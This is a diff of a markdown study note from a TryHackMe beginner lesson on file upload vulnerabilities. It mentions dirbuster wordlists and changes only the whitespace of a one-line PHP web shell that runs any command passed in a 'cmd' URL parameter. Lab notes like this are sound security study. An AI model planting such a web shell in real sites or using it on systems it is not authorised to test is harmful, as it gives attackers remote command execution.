@@ -6,11 +6,6 @@ original_link: https://cardboard-iguana.com/log/2021-10-08-tryhackme-complete-be
 author: 100007
 ---
 
-# TryHackMe: Complete Beginner
-
-**author:** Nathan Acks  
-**date:** 2021-10-08
-
 # Upload Vulnerabilities
 
 ## Overwriting Existing Files
@@ -30,8 +25,8 @@ The /usr/share/wordlists/dirbuster directory holds lists of various common direc
 The simplest PHP web shell:
 
 ```
-<?php
-echo system($_GET["cmd"]);
+<?php  
+    echo system($_GET["cmd"]);  
 ?>
 ```
 
